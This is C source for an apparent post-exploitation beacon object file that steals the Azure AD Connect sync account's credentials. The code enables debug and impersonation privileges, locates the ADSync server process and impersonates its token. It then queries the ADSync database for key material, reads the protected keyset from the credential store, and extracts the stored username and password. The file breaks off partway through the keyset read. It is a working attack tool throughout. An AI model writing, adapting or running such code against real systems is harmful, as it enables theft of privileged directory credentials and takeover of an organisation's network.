#define _CRT_SECURE_NO_WARNINGS

#include <windows.h>
#include <odbcinst.h>
#include <sqlext.h>
#include <wincred.h>
#include <tlhelp32.h>

#include "beacon.h"

#pragma comment(lib, "legacy_stdio_definitions.lib")
#pragma comment(lib, "Crypt32")


// Printf shorthand for development purposes
#ifdef _DEBUG
#include <stdio.h>
#define BeaconPrintf(type, fmt, ...) printf(fmt "\n", __VA_ARGS__)
#endif


// Beacon imports
#ifndef _DEBUG

// KERNEL32
DECLSPEC_IMPORT DWORD KERNEL32$GetLastError();
DECLSPEC_IMPORT HLOCAL KERNEL32$LocalFree(HLOCAL hMem);
DECLSPEC_IMPORT HANDLE KERNEL32$GetProcessHeap();
DECLSPEC_IMPORT LPVOID KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
DECLSPEC_IMPORT BOOL KERNEL32$HeapFree(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
DECLSPEC_IMPORT HANDLE KERNEL32$CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
DECLSPEC_IMPORT BOOL KERNEL32$Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
DECLSPEC_IMPORT BOOL KERNEL32$Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
DECLSPEC_IMPORT BOOL KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT HANDLE KERNEL32$GetCurrentThread(VOID);
DECLSPEC_IMPORT HANDLE KERNEL32$GetCurrentProcess(VOID);
DECLSPEC_IMPORT HANDLE KERNEL32$OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);

// MSVCRT
DECLSPEC_IMPORT PVOID MSVCRT$memcpy(PVOID dst, CONST PVOID src, SIZE_T size);
DECLSPEC_IMPORT SIZE_T MSVCRT$wcslen(CONST WCHAR* str);
DECLSPEC_IMPORT WCHAR* MSVCRT$wcsstr(CONST WCHAR* str, CONST WCHAR* strSearch);

DECLSPEC_IMPORT SIZE_T MSVCRT$strlen(CONST CHAR* str);
DECLSPEC_IMPORT CHAR* MSVCRT$strchr(CONST CHAR* str, CONST CHAR strSearch);
DECLSPEC_IMPORT CHAR* MSVCRT$strstr(CONST CHAR* str, CONST CHAR* strSearch);
DECLSPEC_IMPORT INT WINAPIV MSVCRT$sprintf(LPSTR unnamedParam1, LPCSTR unnamedParam2, ...);
DECLSPEC_IMPORT INT MSVCRT$strncmp(CONST CHAR* string1, CONST CHAR* string2, SIZE_T count);
DECLSPEC_IMPORT INT MSVCRT$_wcsicmp(CONST WCHAR* string1, CONST WCHAR* string2);

// USER32
DECLSPEC_IMPORT INT WINAPIV USER32$wsprintfW(LPWSTR unnamedParam1, LPCWSTR unnamedParam2, ...);

// OLE32
DECLSPEC_IMPORT INT OLE32$StringFromGUID2(REFGUID rguid, LPOLESTR lpsz, INT cchMax);

// ODBC32
DECLSPEC_IMPORT BOOL ODBCCP32$SQLGetInstalledDriversW(LPSTR lpszBuf, WORD cbBufMax, WORD* pcbBufOut);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLFetch(SQLHSTMT StatementHandle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLDisconnect(SQLHDBC ConnectionHandle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLFreeHandle(SQLSMALLINT HandleType, SQLHANDLE Handle);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLFreeStmt(SQLHSTMT StatementHandle, SQLUSMALLINT Option);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLExecDirectW(SQLHSTMT StatementHandle, SQLCHAR* StatementText, SQLINTEGER TextLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLAllocHandle(SQLSMALLINT HandleType, SQLHANDLE InputHandle, SQLHANDLE* OutputHandlePtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLSetEnvAttr(SQLHENV EnvironmentHandle, SQLINTEGER Attribute, SQLPOINTER ValuePtr, SQLINTEGER StringLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLSetConnectAttrW(SQLHDBC ConnectionHandle, SQLINTEGER Attribute, SQLPOINTER ValuePtr, SQLINTEGER StringLength);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLBindCol(SQLHSTMT StatementHandle, SQLUSMALLINT ColumnNumber, SQLSMALLINT TargetType, SQLPOINTER TargetValuePtr, SQLLEN BufferLength, SQLLEN* StrLen_or_IndPtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLGetDiagRecW(SQLSMALLINT HandleType, SQLHANDLE Handle, SQLSMALLINT RecNumber, SQLCHAR* SQLState, SQLINTEGER* NativeErrorPtr, SQLCHAR* MessageText, SQLSMALLINT BufferLength, SQLSMALLINT* TextLengthPtr);
DECLSPEC_IMPORT SQLRETURN ODBC32$SQLDriverConnectW(SQLHDBC ConnectionHandle, SQLHWND WindowHandle, SQLCHAR* InConnectionString, SQLSMALLINT StringLength1, SQLCHAR* OutConnectionString, SQLSMALLINT BufferLength, SQLSMALLINT* StringLength2Ptr, SQLUSMALLINT DriverCompletion);

// CRYPT32
DECLSPEC_IMPORT BOOL CRYPT32$CryptUnprotectData(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);
DECLSPEC_IMPORT BOOL CRYPT32$CryptStringToBinaryA(LPCSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags);

// ADVAPI32
DECLSPEC_IMPORT BOOL ADVAPI32$CredReadW(LPCWSTR TargetName, DWORD Type, DWORD Flags, PCREDENTIALW* Credential);
DECLSPEC_IMPORT VOID ADVAPI32$CredFree(PVOID buffer);
DECLSPEC_IMPORT BOOL ADVAPI32$CryptDestroyKey(HCRYPTKEY hKey);
DECLSPEC_IMPORT BOOL ADVAPI32$CryptReleaseContext(HCRYPTPROV hProv, DWORD dwFlags);
DECLSPEC_IMPORT BOOL ADVAPI32$CryptAcquireContextW(HCRYPTPROV* phProv, LPCWSTR szContainer, LPCWSTR szProvider, DWORD dwProvType, DWORD dwFlags);
DECLSPEC_IMPORT BOOL ADVAPI32$CryptImportKey(HCRYPTPROV hProv, CONST BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey);
DECLSPEC_IMPORT BOOL ADVAPI32$CryptSetKeyParam(HCRYPTKEY hKey, DWORD dwParam, CONST BYTE* pbData, DWORD dwFlags);
DECLSPEC_IMPORT BOOL ADVAPI32$CryptDecrypt(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen);
DECLSPEC_IMPORT BOOL ADVAPI32$AdjustTokenPrivileges(HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength);
DECLSPEC_IMPORT BOOL ADVAPI32$LookupPrivilegeValueW(LPCWSTR lpSystemName, LPCWSTR lpName, PLUID lpLuid);
DECLSPEC_IMPORT BOOL ADVAPI32$OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL ADVAPI32$OpenThreadToken(HANDLE ThreadHandle, DWORD DesiredAccess, BOOL OpenAsSelf, PHANDLE TokenHandle);
DECLSPEC_IMPORT BOOL ADVAPI32$DuplicateTokenEx(HANDLE hExistingToken, DWORD dwDesiredAccess, LPSECURITY_ATTRIBUTES lpTokenAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, TOKEN_TYPE TokenType, PHANDLE phNewToken);
DECLSPEC_IMPORT BOOL ADVAPI32$SetThreadToken(PHANDLE Thread, HANDLE Token);
DECLSPEC_IMPORT BOOL ADVAPI32$RevertToSelf(VOID);
#endif


// Shorthand for using beacon imports instead of using KERNEL32$...
#ifdef _DEBUG
#define API(x, y) y
#else
#define API(x, y) x##$##y
#endif


// Constants
#define VERBOSE FALSE
#define CONNECTION_STRING_FMT L"Driver={%ls};Server=(LocalDB)\\.\\ADSync2019;Database=ADSync;Trusted_Connection=yes"
#define QUERY_KEY_METADATA L"SELECT instance_id, keyset_id, entropy FROM mms_server_configuration;"
#define QUERY_KEY_MATERIAL L"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;"
#define CREDENTIAL_KEY_FMT L"Microsoft_AzureADConnect_KeySet_%ls_100000"
#define ADSYNC_DATABASE_PROCESS L"miiserver.exe"

// Utility macro's / constants
#define BofHeapAlloc(size) API(KERNEL32, HeapAlloc)(API(KERNEL32, GetProcessHeap)(), HEAP_ZERO_MEMORY, size)
#define BofHeapFree(buf) API(KERNEL32, HeapFree)(API(KERNEL32, GetProcessHeap)(), NULL, buf)
#define IS_SQL_SUCCESS(r) (r == SQL_SUCCESS || r == SQL_SUCCESS_WITH_INFO)

#define GUID_SIZE 40
#define CONNECT_TIMEOUT 5

#define IV_LENGTH 16
#define IV_OFFSET 8

#define KEY_OFFSET 88
#define KEY_SIZE 44

#define BLOCK_SIZE 16
#define CONFIG_SIZE 1024 * 32


// Helper functions
CHAR* html_unescape(CHAR* str) {
    INT len = API(MSVCRT, strlen)(str);
    CHAR* result = BofHeapAlloc(len + 1);
    INT offset = 0;

    for (INT i = 0; i < len; i++) {
        if (str[i] == '&') {
            if (API(MSVCRT, strncmp)(str + i, "&lt;", 4) == 0) {
                result[offset++] = '<';
                i += 3;
            }
            else if (API(MSVCRT, strncmp)(str + i, "&gt;", 4) == 0) {
                result[offset++] = '>';
                i += 3;
            }
            else if (API(MSVCRT, strncmp)(str + i, "&amp;", 5) == 0) {
                result[offset++] = '&';
                i += 4;
            }
            else {
                result[offset++] = str[i];
            }
        }
        else {
            result[offset++] = str[i];
        }
    }

    result[offset] = '\0';
    return result;
}

CONST CHAR* ptnscan(CONST CHAR* haystack, CONST CHAR* needle) {
    INT haystackLen = API(MSVCRT, strlen)(haystack);
    INT needleLen = API(MSVCRT, strlen)(needle);

    for (INT i = 0; i < haystackLen - needleLen; i++) {
        for (INT j = 0; j < needleLen; j++) {
            if (needle[j] == '?') {
                continue;
            }

            if (haystack[i + j] != needle[j]) {
                break;
            }


            if (j == needleLen - 1) {
                return &haystack[i];
            }

        }
    }

    return NULL;
}

CONST CHAR* find_password(CONST CHAR* xml) {
    CONST CHAR needle[] = "<attribute name=??assword?>";
    CONST CHAR* start = ptnscan(xml, needle) + sizeof(needle) - 1;
    CONST CHAR* end = ptnscan(start, "</attribute>");
    size_t size = (ptrdiff_t)end - (ptrdiff_t)start;
    CHAR* unescaped = (CHAR*)BofHeapAlloc(size + 1);
    if (!unescaped) {
        return NULL;
    }

    API(MSVCRT, memcpy)(unescaped, start, size);
    unescaped[size] = '\x00';

    CHAR* escaped = html_unescape(unescaped);
    BofHeapFree(unescaped);
    return escaped;
}

CONST CHAR* find_username(CONST CHAR* xml) {
    CONST CHAR* usernameStart = ptnscan(xml, "name=?UserName? type=");
    CONST CHAR* valueStart = ptnscan(usernameStart, ">") + 1;
    CONST CHAR* valueEnd = ptnscan(valueStart, "</parameter>");
    size_t size = (ptrdiff_t)valueEnd - (ptrdiff_t)valueStart;
    CHAR* unescaped = (CHAR*)BofHeapAlloc(size + 1);
    if (!unescaped) {
        return NULL;
    }

    API(MSVCRT, memcpy)(unescaped, valueStart, size);
    unescaped[size] = '\x00';

    CHAR* escaped = html_unescape(unescaped);
    BofHeapFree(unescaped);
    return escaped;
}

CONST SQLWCHAR* get_last_sql_error(SQLHDBC sqlConnHandle, SQLRETURN sqlResult) {
    SQLWCHAR sqlState[6], errorMessage[SQL_MAX_MESSAGE_LENGTH];
    SQLINTEGER nativeError;
    SQLSMALLINT messageLength;
    CONST WCHAR format[] = L"Return code: 0x%x; SQL state: %ls; Native error: %d; Message: %ls";

    // Size breakdown
    //  format = hard-coded length
    //  sqlmessage = SQL_MAX_MESSAGE_LENGTH
    //  sqlstate = 6 chars
    //  native error code = 8 chars
    //  return code hex = 8 chars (maybe -2, better reserve too many)
    static SQLWCHAR message[SQL_MAX_MESSAGE_LENGTH + sizeof(format) + sizeof(sqlState) + 8 + 8];

    API(ODBC32, SQLGetDiagRecW)(SQL_HANDLE_DBC, sqlConnHandle, 1, sqlState, &nativeError, errorMessage, SQL_MAX_MESSAGE_LENGTH, &messageLength);
    API(USER32, wsprintfW)(message, format, sqlResult, sqlState, nativeError, errorMessage);
    return message;
}

BOOL set_privilege(LPCWSTR lpszPrivilege, BOOL bEnablePrivilege) {
    HANDLE hToken = NULL;
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!API(ADVAPI32, OpenProcessToken)(API(KERNEL32, GetCurrentProcess)(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process token. Error: %d\n", API(KERNEL32, GetLastError)());
        return FALSE;
    }

    if (!API(ADVAPI32, LookupPrivilegeValueW)(NULL, lpszPrivilege, &luid)) {
        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValueW failed. Error: %d, Privilege: %ls\n", API(KERNEL32, GetLastError)(), lpszPrivilege);
        API(KERNEL32, CloseHandle)(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    if (bEnablePrivilege) {
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    }
    else {
        tp.Privileges[0].Attributes = 0;
    }

    if (!API(ADVAPI32, AdjustTokenPrivileges)(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges failed. Error: %d\n", API(KERNEL32, GetLastError)());
        API(KERNEL32, CloseHandle)(hToken);
        return FALSE;
    }

    API(KERNEL32, CloseHandle)(hToken);
    return TRUE;
}


// Main entrypoint
#ifdef _DEBUG
void main() {
#else
void go(PCHAR args, int alen) {
#endif

    // Token impersonation
    HANDLE hCurrentThread = NULL;
    HANDLE hProcessSnapshot = NULL;
    PROCESSENTRY32W processEntry = { 0 };
    DWORD adSyncProcessId = 0;
    HANDLE hAdSyncProcess = NULL;
    HANDLE hAdSyncProcessToken = NULL;
    HANDLE hAdSyncProcessTokenDup = NULL;

    // Database connection / handles
    BOOL sqlConnected = FALSE;
    SQLHENV sqlEnvHandle = NULL;
    SQLHDBC sqlConnHandle = NULL;
    SQLHSTMT sqlStmtHandle = NULL;
    SQLRETURN sqlResult;
    WCHAR sqlDriverList[1024];
    WCHAR* sqlDriverName = NULL;
    WCHAR* sqlConnectionString = NULL;

    // Database return values
    SQLGUID adSyncInstanceId = { 0 };
    SQLGUID adSyncKeyEntropyId = { 0 };
    SQLINTEGER adSyncKeysetId = NULL;
    WCHAR adSyncInstanceIdStr[GUID_SIZE] = { 0 };
    WCHAR adSyncKeyEntropyIdStr[GUID_SIZE] = { 0 };

    // Crypto stuff
    SQLCHAR* adSyncPrivateConfig = NULL;
    SQLCHAR* adSyncEncryptedConfig = NULL;
    BYTE* adSyncDecodedConfig = NULL;
    DWORD adSyncDecodedConfigSize = 0;
    DWORD adSyncDecodedConfigHeaderSize = 0;

    WCHAR* adSyncCredentialKey = NULL;
    PCREDENTIALW adSyncEncryptedKeyset = { 0 };
    DATA_BLOB adSyncDecryptedKeySetBlob = { 0 };
    DATA_BLOB adSyncEncryptedKeySetBlob = { 0 };
    DATA_BLOB adSyncEncryptedKeySetEntropyBlob = { 0 };

    HCRYPTPROV hCryptoProvider = NULL;
    HCRYPTKEY hCryptoKey = NULL;
    WCHAR* adSyncDecryptedConfig = NULL;
    CHAR* adSyncDecryptedConfigASCII = NULL;

    // Final results
    CHAR* adSyncUsername = NULL;
    CHAR* adSyncPassword = NULL;


    // Ensure we have the right privileges
    // TODO: Restore these to their original values
    if (!set_privilege(L"SeDebugPrivilege", TRUE)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable SeDebugPrivilege.\n");
        goto cleanup;
    }

    if (!set_privilege(L"SeImpersonatePrivilege", TRUE)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to enable SeImpersonatePrivilege.\n");
        goto cleanup;
    }


    // Get a snapshot of all processes
    hProcessSnapshot = API(KERNEL32, CreateToolhelp32Snapshot)(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnapshot == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to identify PID of the ADSync database server; failed to create process list snapshot.\n");
        goto cleanup;
    }

    // Set the size of the structure before calling the function
    processEntry.dwSize = sizeof(PROCESSENTRY32W);

    // Retrieve information about the first process and exit if unsuccessful
    if (!API(KERNEL32, Process32FirstW)(hProcessSnapshot, &processEntry)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to identify PID of the ADSync database server; failed to retrieve first process list entry.\n");
        goto cleanup;
    }

    // Enumerate processes and find the ADSync database process
    do {
        if (API(MSVCRT, _wcsicmp)(processEntry.szExeFile, ADSYNC_DATABASE_PROCESS) == 0) {
            adSyncProcessId = processEntry.th32ProcessID;
            break;
        }
    } while (API(KERNEL32, Process32NextW)(hProcessSnapshot, &processEntry));

    if (adSyncProcessId != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "Found '%ls' with PID: %d\n", ADSYNC_DATABASE_PROCESS, adSyncProcessId);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "Failed to identify PID of the ADSync database server; process does not appear in process list.\n");
        goto cleanup;
    }


    // Allocate the environment handle, and set the ODBC version
    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_ENV, SQL_NULL_HANDLE, &sqlEnvHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL environment handle.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLSetEnvAttr)(sqlEnvHandle, SQL_ATTR_ODBC_VERSION, (SQLPOINTER*)SQL_OV_ODBC3, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set ODBC environment attributes.");
        goto cleanup;
    }

    // Obtain valid driver name
    if (!API(ODBCCP32, SQLGetInstalledDriversW)(sqlDriverList, sizeof(sqlDriverList) / sizeof(WCHAR), NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to obtain SQL driver list.");
        goto cleanup;
    }

    for (CONST WCHAR* driver = sqlDriverList; *driver; driver += API(MSVCRT, wcslen)(driver) + 1) {
        if (API(MSVCRT, wcsstr)(driver, L"ODBC Driver ") && API(MSVCRT, wcsstr)(driver, L"for SQL Server")) {
            sqlDriverName = driver;
            break;
        }
    }

    if (!sqlDriverName) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to obtain valid ODBC SQL driver name.");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Using ODBC driver: %ls\n\n", sqlDriverName);

    // Build connection string
    sqlConnectionString = BofHeapAlloc((API(MSVCRT, wcslen)(sqlDriverName) * sizeof(WCHAR)) + sizeof(CONNECTION_STRING_FMT));
    if (!sqlConnectionString) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for SQL connection string.");
        goto cleanup;
    }

    API(USER32, wsprintfW)(sqlConnectionString, CONNECTION_STRING_FMT, sqlDriverName);  // No it's not a buffer overflow

    // Allocate the connection handle
    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_DBC, sqlEnvHandle, &sqlConnHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL connection handle.");
        goto cleanup;
    }

    // Specify the timeout (default = 30)
    sqlResult = API(ODBC32, SQLSetConnectAttrW)(sqlConnHandle, SQL_LOGIN_TIMEOUT, (SQLPOINTER)CONNECT_TIMEOUT, 0);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to set timeout attribute on connection handle.");
        goto cleanup;
    }

    // Connect to the database
    sqlResult = API(ODBC32, SQLDriverConnectW)(
        sqlConnHandle,
        NULL,
        sqlConnectionString,
        SQL_NTS,
        NULL,
        0,
        NULL,
        SQL_DRIVER_NOPROMPT
    );
    if (IS_SQL_SUCCESS(sqlResult)) {
        sqlConnected = TRUE;
    }
    else {
        BeaconPrintf(CALLBACK_ERROR,
            "Failed to connect to the ADSync2019\\ADSync database. %ls\n\n"
            "Note: Using an impersonation token as the ADSync user might"
            "result in a 'MAX_PROVS' error. Try spawning a new session"
            "under the impersonated user's context.\n",
            get_last_sql_error(sqlConnHandle, sqlResult)
        );
        goto cleanup;
    }


    // Obtain metadata
    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_STMT, sqlConnHandle, &sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL statement handle.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, QUERY_KEY_METADATA, SQL_NTS);
    if (sqlResult != SQL_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to query ADSync key metadata.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 1, SQL_C_GUID, &adSyncInstanceId, sizeof(adSyncInstanceId), NULL);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to bind metadata instance id column.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 2, SQL_C_LONG, &adSyncKeysetId, sizeof(adSyncKeysetId), NULL);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to bind metadata keyset id column.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 3, SQL_C_GUID, &adSyncKeyEntropyId, sizeof(adSyncKeyEntropyId), NULL);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to bind metadata key entropy id column.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLFetch)(sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to fetch ADSync key metadata.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLFreeStmt)(sqlStmtHandle, SQL_CLOSE);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to free sql statement handle (after key metadata).");
        goto cleanup;
    }

    if (!API(OLE32, StringFromGUID2)(&adSyncInstanceId, adSyncInstanceIdStr, GUID_SIZE)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to case ad sync instance id from guid to string.");
        goto cleanup;
    }

    if (!API(OLE32, StringFromGUID2)(&adSyncKeyEntropyId, adSyncKeyEntropyIdStr, GUID_SIZE)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to case ad sync entropy id from guid to string.");
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "Successfully obtained ADSync instance metadata:\n\n\tInstance ID: %ls\n\tEntropy ID: %ls\n\tKeyset ID: 0x%x\n\n",
        adSyncInstanceIdStr, adSyncKeyEntropyIdStr, adSyncKeysetId
    );


    // Obtain key material
    sqlResult = API(ODBC32, SQLAllocHandle)(SQL_HANDLE_STMT, sqlConnHandle, &sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate SQL statement handle.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLExecDirectW)(sqlStmtHandle, QUERY_KEY_MATERIAL, SQL_NTS);
    if (sqlResult != SQL_SUCCESS) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to query ADSync key material.");
        goto cleanup;
    }

    adSyncPrivateConfig = BofHeapAlloc(CONFIG_SIZE * sizeof(SQLCHAR));

    if (!adSyncPrivateConfig) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for private config. Error code: 0x%lx", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    adSyncEncryptedConfig = BofHeapAlloc(CONFIG_SIZE * sizeof(SQLCHAR));

    if (!adSyncEncryptedConfig) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for encrypted config. Error code: 0x%lx", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 1, SQL_C_CHAR, adSyncPrivateConfig, CONFIG_SIZE * sizeof(SQLCHAR), NULL);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to bind private config column.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLBindCol)(sqlStmtHandle, 2, SQL_C_CHAR, adSyncEncryptedConfig, CONFIG_SIZE * sizeof(SQLCHAR), NULL);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to bind encrypted config column.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLFetch)(sqlStmtHandle);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to fetch ADSync key material.");
        goto cleanup;
    }

    sqlResult = API(ODBC32, SQLFreeStmt)(sqlStmtHandle, SQL_CLOSE);
    if (!IS_SQL_SUCCESS(sqlResult)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to free sql statement handle (after key material).");
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "Successfully obtained ADSync instance key materials:\n\n"
            "\tPrivate config: %s\n\n",
            adSyncPrivateConfig
        );
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully obtained ADSync instance key materials.\n");
    }


    // Base64 decode the encrypted blob
    if (!API(CRYPT32, CryptStringToBinaryA)(adSyncEncryptedConfig, API(MSVCRT, strlen)(adSyncEncryptedConfig), CRYPT_STRING_BASE64, NULL, &adSyncDecodedConfigSize, &adSyncDecodedConfigHeaderSize, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to obtain decoded config blob size.");
        goto cleanup;
    }

    adSyncDecodedConfig = BofHeapAlloc(adSyncDecodedConfigSize);

    if (!API(CRYPT32, CryptStringToBinaryA)(adSyncEncryptedConfig, API(MSVCRT, strlen)(adSyncEncryptedConfig), CRYPT_STRING_BASE64, adSyncDecodedConfig, &adSyncDecodedConfigSize, &adSyncDecodedConfigHeaderSize, NULL)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to decode encrypted config blob.");
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully base64 decoded encrypted config blob.\n");
    }


    // Fetch the keyset (CKeyManager::LoadKeySet)
    adSyncCredentialKey = BofHeapAlloc(sizeof(CREDENTIAL_KEY_FMT) + sizeof(adSyncInstanceIdStr));
    if (!adSyncCredentialKey) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to allocate memory for keyset.");
        goto cleanup;
    }


    // Impersonate the ADSync server process
    hAdSyncProcess = API(KERNEL32, OpenProcess)(PROCESS_QUERY_INFORMATION, FALSE, adSyncProcessId);
    if (hAdSyncProcess == NULL) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open the ADSync database process. Error: %d\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully opened process handle\n");
    }

    if (!API(ADVAPI32, OpenProcessToken)(hAdSyncProcess, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE, &hAdSyncProcessToken)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process token. Error: %d\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully opened process token\n");
    }

    if (!API(ADVAPI32, DuplicateTokenEx)(hAdSyncProcessToken, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY | TOKEN_IMPERSONATE, NULL, SecurityImpersonation, TokenImpersonation, &hAdSyncProcessTokenDup)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to duplicate token. Error: %d\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    if (VERBOSE) {
        BeaconPrintf(CALLBACK_OUTPUT, "Successfully duplicated process token\n");
    }

    hCurrentThread = API(KERNEL32, GetCurrentThread)();
    if (!API(ADVAPI32, SetThreadToken)(&hCurrentThread, hAdSyncProcessTokenDup)) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate process. Error: %d\n", API(KERNEL32, GetLastError)());
        goto cleanup;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "Successfully impersonated ADSync database server token.\n");

    // Obtain the credential key
    API(USER32, wsprintfW)(adSyncCredentialKey, CREDENTIAL_KEY_FMT, adSyncInstanceIdStr);
    if (!API(ADVAPI32, CredReadW)(adSyncCredentialKey, CRED_TYPE_GENERIC, 0, &adSyncEncryptedKeyset)) {
        BeaconPrintf(CALLBACK_ERROR,
            "Failed to read keyset '%ls'. Error code: 0x%lx\n\n"
            "Note: You might need to obtain the keyset via a process initiated as the ADSync user. "
            "Using an impersonation token doesn't always work. Try spawning a new session with an ADSync user's context.\n",
